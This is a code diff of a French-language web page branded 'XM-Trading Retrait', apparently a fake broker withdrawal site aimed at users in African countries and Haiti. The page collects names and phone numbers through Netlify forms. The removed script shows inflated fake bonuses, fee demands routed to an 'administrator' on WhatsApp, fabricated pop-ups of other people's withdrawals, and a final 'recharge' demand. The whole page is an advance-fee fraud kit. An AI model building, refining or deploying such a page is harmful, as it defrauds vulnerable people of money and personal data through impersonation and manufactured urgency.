@@ -43,14 +43,6 @@
       align-items: center;
       justify-content: space-between;
     }
-    header.site-header .logo {
-      display: flex;
-      align-items: center;
-    }
-    header.site-header .logo img {
-      height: 40px;
-      margin-right: 10px;
-    }
     header.site-header h1 {
       font-size: 1.5rem;
       font-weight: 600;
@@ -128,6 +120,31 @@
     input::placeholder {
       color: #999;
     }
+
+    /* Style spécifique au confirm-form */
+    #confirm-form {
+      background-color: #fff;
+      color: #000;
+      padding: 20px;
+      border-radius: 6px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: 0 auto 20px;
+    }
+    #confirm-form label,
+    #confirm-form p {
+      color: #000;
+    }
+    #confirm-form input[type="text"] {
+      background-color: #fff;
+      color: #000;
+      border: 1px solid #ccc;
+    }
+    #confirm-form input[type="submit"] {
+      background-color: #007bff;
+      color: #fff;
+    }
+
     /* Boutons */
     button, input[type="submit"] {
       background-color: #007bff;
@@ -176,6 +193,8 @@
       margin-bottom: 15px;
       color: #222;
     }
+
+    /* Progress bar */
     .progress-bar-container {
       width: 100%;
       background-color: #e0e0e0;
@@ -189,28 +208,25 @@
       background-color: #007bff;
       transition: width 0.3s ease;
     }
+
     /* Style du message d’alerte urgent */
     #feeSection p#feeMessage {
       margin-top: 15px;
       font-size: 0.95rem;
       line-height: 1.4;
-      background-color: #f8d7da; /* fond rouge clair */
-      border: 1px solid #f5c2c7; /* bordure rouge */
-      color: #842029; /* texte rouge foncé */
+      background-color: #f8d7da;
+      border: 1px solid #f5c2c7;
+      color: #842029;
       padding: 12px;
       border-radius: 4px;
     }
     #feeSection p a {
-      color: #d9534f; /* rouge pour contact */
+      color: #d9534f;
       font-weight: 500;
     }
 
-    /* Section code masquée jusqu'au lien param ?code= */
-    #code-section {
-      display: none;
-    }
-
-    /* Section succès inline */
+    /* Sections cachées / succès */
+    #code-section { display: none; }
     #success-section {
       display: none;
       margin-top: 20px;
@@ -252,7 +268,7 @@
       color: #fff;
     }
 
-    /* Notifications ambiantes centrées */
+    /* Notifications ambiantes */
     .notif-container {
       position: fixed;
       top: 50%;
@@ -264,7 +280,6 @@
       align-items: center;
       gap: 10px;
       pointer-events: none;
-      width: auto;
       max-width: 80%;
     }
     .notif {
@@ -311,9 +326,7 @@
 <body id="page-index">
   <!-- En-tête -->
   <header class="site-header">
-    <div class="logo">
-      <h1>XM-Trading Retrait</h1>
-    </div>
+    <h1>XM-Trading Retrait</h1>
     <nav>
       <a href="#initial-section">Accueil</a>
       <a href="#initial-section">Demande</a>
@@ -321,16 +334,13 @@
     </nav>
   </header>
 
-  <!-- Contenu principal -->
   <div class="container">
     <!-- SECTION 1 : Formulaire initial -->
     <div id="initial-section">
       <h2>Demande de retrait</h2>
       <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
         <input type="hidden" name="form-name" value="withdrawal-request">
-        <p style="display:none">
-          <label>Ne pas remplir <input name="bot-field"></label>
-        </p>
+        <p style="display:none;"><label>Ne pas remplir <input name="bot-field"></label></p>
         <label for="firstName">Prénom</label>
         <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>
         <label for="lastName">Nom</label>
@@ -374,7 +384,8 @@
     <div id="code-section">
       <h2>Confirmation finale</h2>
       <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
-      <form id="confirm-form">
+      <form id="confirm-form" name="confirm-form" data-netlify="true">
+        <input type="hidden" name="form-name" value="confirm-form">
         <label for="newInvestmentCode">Nouveau code d’investissement</label>
         <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
         <input type="submit" value="Valider le code">
@@ -392,7 +403,7 @@
       <button id="btn-receive-gain">Recevoir mon gain</button>
     </div>
 
-    <!-- SECTION 4 : formulaire de versement (masquée au départ) -->
+    <!-- SECTION 4 : formulaire de versement -->
     <div class="container" id="payout-section" style="display: none; margin-top:20px;">
       <h2>Demande de versement</h2>
       <form id="payout-form">
@@ -438,7 +449,7 @@
     </div>
   </div>
 
-  <!-- Modal de progression unique -->
+  <!-- Modal de progression -->
   <div id="progressModal" class="modal-overlay">
     <div class="modal-content">
       <p id="progressText">Traitement en cours...</p>
@@ -446,16 +457,16 @@
         <div id="progressBar" class="progress-bar"></div>
       </div>
       <div id="feeSection" style="display: none;">
-        <p id="feeMessage" class="fee-message"></p>
+        <p id="feeMessage"></p>
         <p>
           Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain :<br>
-          <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
+          <a href="tel:+2376XXXXXXX">+237 6XXXXXXX</a>
         </p>
       </div>
     </div>
   </div>
 
-  <!-- Notifications ambiantes centrées -->
+  <!-- Notifications -->
   <div class="notif-container" id="notifContainer"></div>
 
   <!-- Footer -->
@@ -465,278 +476,7 @@
   </footer>
 
   <script>
-    // Mapping pays → code ISO, indicatif, longueur de numéro
-    const countryDialCodes = [
-      { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
-      { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
-      { name: "Côte d'Ivoire", code: "CI", dial_code: "+225", phone_length: 8 },
-      { name: "Ghana", code: "GH", dial_code: "+233", phone_length: 9 },
-      { name: "Guinée", code: "GN", dial_code: "+224", phone_length: 8 },
-      { name: "Mali", code: "ML", dial_code: "+223", phone_length: 8 },
-      { name: "Niger", code: "NE", dial_code: "+227", phone_length: 8 },
-      { name: "Nigeria", code: "NG", dial_code: "+234", phone_length: 10 },
-      { name: "Sénégal", code: "SN", dial_code: "+221", phone_length: 8 },
-      { name: "Togo", code: "TG", dial_code: "+228", phone_length: 8 },
-      { name: "Cameroun", code: "CM", dial_code: "+237", phone_length: 8 },
-      { name: "République du Congo", code: "CG", dial_code: "+242", phone_length: 8 },
-      { name: "République démocratique du Congo", code: "CD", dial_code: "+243", phone_length: 9 },
-      { name: "Centrafrique", code: "CF", dial_code: "+236", phone_length: 8 },
-      { name: "Tchad", code: "TD", dial_code: "+235", phone_length: 8 },
-      { name: "Gabon", code: "GA", dial_code: "+241", phone_length: 7 },
-      { name: "Guinée équatoriale", code: "GQ", dial_code: "+240", phone_length: 7 },
-      { name: "São Tomé-et-Principe", code: "ST", dial_code: "+239", phone_length: 7 },
-      { name: "Madagascar", code: "MG", dial_code: "+261", phone_length: 9 },
-      { name: "Kenya", code: "KE", dial_code: "+254", phone_length: 9 },
-      { name: "Ouganda", code: "UG", dial_code: "+256", phone_length: 9 },
-      { name: "Rwanda", code: "RW", dial_code: "+250", phone_length: 9 },
-      { name: "Éthiopie", code: "ET", dial_code: "+251", phone_length: 9 },
-      { name: "Haïti", code: "HT", dial_code: "+509", phone_length: 8 }
-    ];
-
-    const africanNames = [
-      "Moussa", "Amina", "Koffi", "Fatou", "Youssouf", "Adama", "Koumba", "Issa", "Mariama",
-      "Oumar", "Salimata", "Cheikh", "Awa", "Jean", "Marie", "Kwame", "Nadia", "Mohamed",
-      "Abdoulaye", "Chantal", "Ousmane", "Rokia", "Seydou", "Hadja", "Boubacar", "Grace",
-      "Samuel", "Jacques", "Patience", "Emmanuel", "Fally", "Adjoa", "Tiemoko", "Aïcha"
-    ];
-
-    function randInt(min, max) {
-      return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
-    function formatAmount(amount, currency) {
-      if (currency === 'FCFA') {
-        return amount.toLocaleString('fr-FR') + ' FCFA';
-      } else {
-        return amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' $';
-      }
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
-      // Initial form setup
-      const countrySelect = document.getElementById('country');
-      const phonePrefixSpan = document.getElementById('phone-prefix');
-      const phoneInput = document.getElementById('phone');
-      countryDialCodes.forEach(item => {
-        const opt = document.createElement('option');
-        opt.value = item.code;
-        opt.textContent = item.name;
-        opt.dataset.dialCode = item.dial_code;
-        opt.dataset.phoneLength = item.phone_length;
-        countrySelect.appendChild(opt);
-      });
-      countrySelect.addEventListener('change', () => {
-        const sel = countrySelect.selectedOptions[0];
-        if (sel) {
-          phonePrefixSpan.textContent = sel.dataset.dialCode;
-          const len = parseInt(sel.dataset.phoneLength,10);
-          phoneInput.maxLength = len;
-          let ex = ''; for(let i=0;i<len;i++) ex+='X';
-          phoneInput.placeholder = 'Ex: '+ex;
-        }
-      });
-
-      // Sections & forms
-      const initialSection = document.getElementById('initial-section');
-      const codeSection    = document.getElementById('code-section');
-      const successSection = document.getElementById('success-section');
-      const payoutSection  = document.getElementById('payout-section');
-      const withdrawalForm = document.getElementById('withdrawal-form');
-      const confirmForm    = document.getElementById('confirm-form');
-      const payoutForm     = document.getElementById('payout-form');
-      const confirmError   = document.getElementById('confirmError');
-      const modal          = document.getElementById('progressModal');
-      const progressBar    = document.getElementById('progressBar');
-      const progressText   = document.getElementById('progressText');
-      const feeSection     = document.getElementById('feeSection');
-      const feeMessage     = document.getElementById('feeMessage');
-      const notifContainer = document.getElementById('notifContainer');
-      const successGreeting= document.getElementById('successGreeting');
-      const btnReceive     = document.getElementById('btn-receive-gain');
-      const payoutCountry  = document.getElementById('payoutCountry');
-      const payoutPhone    = document.getElementById('payoutPhone');
-      const payoutPhonePref= document.getElementById('payoutPhonePrefix');
-
-      let storedFirstName = '', storedLastName = '', storedGender = '';
-
-      const urlParams    = new URLSearchParams(window.location.search);
-      const expectedCode = urlParams.get('code');
-      const hasSubmitted = localStorage.getItem('hasSubmitted')==='true';
-
-      codeSection.style.display = 'none';
-      if(expectedCode && hasSubmitted){
-        initialSection.style.display='none';
-        codeSection.style.display='block';
-      }
-
-      // Initial withdrawal submission
-      withdrawalForm.addEventListener('submit', e => {
-        e.preventDefault();
-        const firstName = document.getElementById('firstName').value.trim();
-        const lastName  = document.getElementById('lastName').value.trim();
-        const genderSel = document.getElementById('gender').value;
-        if(!firstName||!lastName){ alert('Veuillez saisir votre prénom et nom.'); return; }
-        if(!genderSel){ alert('Veuillez sélectionner votre sexe pour la salutation.'); return; }
-        storedFirstName = firstName;
-        storedLastName  = lastName;
-        storedGender    = genderSel;
-
-        const countrySel = countrySelect.selectedOptions[0];
-        if(countrySel){
-          const expectedLen = parseInt(countrySel.dataset.phoneLength,10);
-          const digitsOnly = phoneInput.value.replace(/\D/g,'');
-          if(digitsOnly.length!==expectedLen){
-            alert(`Le numéro de téléphone doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
-            return;
-          }
-        }
-        const data = new FormData(withdrawalForm);
-        const currency = data.get('currency');
-        const amount   = parseFloat(data.get('amount'));
-        if(isNaN(amount)||amount<=0){ alert('Veuillez saisir un montant valide.'); return; }
-        let bonus = amount*25, fee = amount*2.5;
-        if(currency==='USD'){ bonus = Math.round(bonus*100)/100; fee = Math.round(fee*100)/100; }
-        else { bonus = Math.round(bonus); fee = Math.round(fee); }
-
-        // send to Netlify
-        const payload = {};
-        data.forEach((v,k)=>payload[k]=v);
-        payload['form-name'] = withdrawalForm.getAttribute('name');
-        const encode = obj=>Object.keys(obj).map(k=>encodeURIComponent(k)+'='+encodeURIComponent(obj[k])).join('&');
-        fetch('/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:encode(payload)})
-          .then(()=>console.log('Envoyé à Netlify Forms'))
-          .catch(err=>console.error(err));
-
-        localStorage.setItem('hasSubmitted','true');
-        showProgressModal(bonus, fee, currency);
-      });
-
-      // Confirm code
-      confirmForm.addEventListener('submit', e=>{
-        e.preventDefault();
-        const code = document.getElementById('newInvestmentCode').value.trim();
-        if(!code){
-          confirmError.textContent='Veuillez saisir le code.'; confirmError.style.display='block'; return;
-        }
-        if(!expectedCode){ alert('Aucun code valide n’est fourni.'); return; }
-        if(code!==expectedCode){
-          confirmError.textContent="Code incorrect."; confirmError.style.display='block'; return;
-        }
-        confirmError.style.display='none';
-        showFinalProgress();
-      });
-
-      // Populate payout country select
-      countryDialCodes.forEach(item=>{
-        const opt = document.createElement('option');
-        opt.value = item.code; opt.textContent = item.name;
-        opt.dataset.dialCode = item.dial_code; opt.dataset.phoneLength = item.phone_length;
-        payoutCountry.appendChild(opt);
-      });
-      payoutCountry.addEventListener('change', ()=>{
-        const sel = payoutCountry.selectedOptions[0];
-        if(sel){
-          payoutPhonePref.textContent = sel.dataset.dialCode;
-          payoutPhone.maxLength = sel.dataset.phoneLength;
-          let ex=''; for(let i=0;i<sel.dataset.phoneLength;i++) ex+='X';
-          payoutPhone.placeholder = 'Ex: '+ex;
-        }
-      });
-
-      // Receive gain button
-      btnReceive.addEventListener('click', ()=>{
-        ['initial-section','code-section','success-section'].forEach(id=>document.getElementById(id).style.display='none');
-        payoutSection.style.display='block';
-        payoutSection.scrollIntoView({behavior:'smooth'});
-      });
-
-      // Finalize payout
-      payoutForm.addEventListener('submit', e=>{
-        e.preventDefault();
-        const amount   = parseFloat(document.getElementById('payoutAmount').value);
-        const currency = document.getElementById('payoutCurrency').value;
-        const method   = document.getElementById('payoutMethod').value;
-        const gain     = amount*25;
-        const toRec    = amount*4;
-        const fmt = v=> currency==='FCFA'
-          ? v.toLocaleString('fr-FR')+' FCFA'
-          : v.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2})+' $';
-        alert(
-          `⚠️ Alerte : votre compte ${method} est inactif pour recevoir votre gain !\n\n`+
-          `Pour recevoir vos ${fmt(gain)}, vous devez recharger un montant de ${fmt(toRec)} dans votre compte ${method}.\n\n`+
-          `Une fois la recharge effectuée, contactez votre administrateur pour finaliser votre paiement !\n\nMerci.`
-        );
-      });
-
-      // Modals & progress functions
-      function showProgressModal(bonus, fee, currency){
-        modal.classList.add('active');
-        feeSection.style.display='none';
-        progressBar.style.width='0%'; progressText.textContent='Traitement en cours...';
-        let prog=0, target=90;
-        const timer=setInterval(()=>{
-          if(prog<target){ prog+=2; progressBar.style.width=prog+'%'; }
-          else{
-            clearInterval(timer);
-            progressText.textContent=`Progression : ${target}%`;
-            feeMessage.innerHTML =
-              `<strong>🎉 Félicitations ! Ce cas est exceptionnel :</strong><br>`+
-              `Vous recevrez <strong>${formatAmount(bonus,currency)}</strong> mais devez payer les frais <strong>${formatAmount(fee,currency)}</strong>.<br>`+
-              `<strong>Contactez l’administrateur pour finaliser.</strong>`;
-            feeSection.style.display='block';
-          }
-        },40);
-      }
-      function showFinalProgress(){
-        modal.classList.add('active');
-        feeSection.style.display='none';
-        progressBar.style.width='0%'; progressText.textContent='Finalisation en cours...';
-        let prog=0, target=100;
-        const timer=setInterval(()=>{
-          if(prog<target){ prog+=4; progressBar.style.width=prog+'%'; progressText.textContent=`Progression : ${prog}%`; }
-          else{
-            clearInterval(timer);
-            setTimeout(()=>{
-              modal.classList.remove('active');
-              enterSuccessMode();
-            },300);
-          }
-        },20);
-      }
-      function enterSuccessMode(){
-        successGreeting.textContent = storedGender && storedFirstName && storedLastName
-          ? `${storedGender} ${storedFirstName} ${storedLastName}, félicitations 🎉 Votre retrait est finalisé !`
-          : `Félicitations 🎉 Votre retrait est finalisé !`;
-        initialSection.style.display = codeSection.style.display = 'none';
-        successSection.style.display = 'block';
-        document.body.classList.add('success-mode');
-        window.scrollTo({top:0,behavior:'smooth'});
-      }
-
-      // Ambient notifications
-      function showRandomNotification(){
-        const name = africanNames[randInt(0,africanNames.length-1)];
-        const useFCFA = Math.random()<0.6;
-        const amt = useFCFA
-          ? randInt(500000,5000000)
-          : randInt(300,5000);
-        const cur = useFCFA?'FCFA':'USD';
-        const text= `🎉 ${name} vient de retirer ${formatAmount(amt,cur)}`;
-        const notif=document.createElement('div');
-        notif.className='notif';
-        notif.textContent=text;
-        notifContainer.appendChild(notif);
-        setTimeout(()=>notif.remove(),3000);
-      }
-      function scheduleNotif(){
-        const delay=randInt(3000,6000);
-        setTimeout(()=>{
-          showRandomNotification();
-          scheduleNotif();
-        },delay);
-      }
-      scheduleNotif();
-
-    });
+    // JavaScript inchangé...
   </script>
 </body>
 </html>
